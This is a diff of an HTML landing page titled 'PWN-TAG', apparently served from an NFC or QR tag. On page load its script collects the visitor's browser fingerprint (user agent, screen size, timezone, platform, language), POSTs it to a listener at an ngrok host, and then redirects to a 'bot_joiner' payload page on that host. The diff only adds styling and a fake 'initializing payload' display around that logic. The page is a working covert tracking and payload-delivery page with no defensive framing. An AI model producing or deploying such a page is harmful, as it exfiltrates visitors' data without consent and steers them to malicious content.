@@ -1,30 +1,89 @@
-<html>
-  <head>
-    <title>PWN TAG :: Test Shell</title>
-    <script>
-      // Gather basic fingerprint
-      const log = {
-        userAgent: navigator.userAgent,
-        screen: `${screen.width}x${screen.height}`,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        platform: navigator.platform,
-        lang: navigator.language
-      };
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>PWN-TAG Activated</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: #00ffcc;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      overflow: hidden;
+    }
 
-      // Send log to your listener
-      fetch("https://pwn-tag.ngrok.app/testlog", {
-        method: "POST",
-        body: JSON.stringify(log),
-        headers: { "Content-Type": "application/json" }
-      });
+    h1 {
+      font-size: 32px;
+      margin: 0;
+      animation: fadeIn 1s ease-out forwards;
+    }
 
-      // Short delay then redirect to real payload
-      setTimeout(() => {
-        window.location.href = "https://pwn-tag.ngrok.app/payloads/bot_joiner.html";
-      }, 300); // 300ms is usually safe
-    </script>
-  </head>
-  <body>
-    <p>One sec bb...</p>
-  </body>
+    p {
+      font-size: 16px;
+      margin-top: 15px;
+      color: #888;
+      animation: fadeIn 1.5s ease-out forwards;
+    }
+
+    .glow {
+      text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
+      letter-spacing: 1px;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: scale(0.95); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    .spinner {
+      border: 4px solid #0f0f0f;
+      border-top: 4px solid #00ffcc;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin-top: 30px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+
+  <script>
+    //  Device fingerprint log
+    const log = {
+      userAgent: navigator.userAgent,
+      screen: `${screen.width}x${screen.height}`,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      platform: navigator.platform,
+      lang: navigator.language
+    };
+
+    // Send to listener
+    fetch("https://pwn-tag.ngrok.app/testlog", {
+      method: "POST",
+      body: JSON.stringify(log),
+      headers: { "Content-Type": "application/json" }
+    });
+
+    //  Redirect to real payload
+    setTimeout(() => {
+      window.location.href = "https://pwn-tag.ngrok.app/payloads/bot_joiner.html";
+    }, 1500); // slightly slower for dramatic effect
+  </script>
+</head>
+
+<body>
+  <h1 class="glow">🔓 PWN-TAG Triggered</h1>
+  <p>Initializing payload...</p>
+  <div class="spinner"></div>
+</body>
 </html>
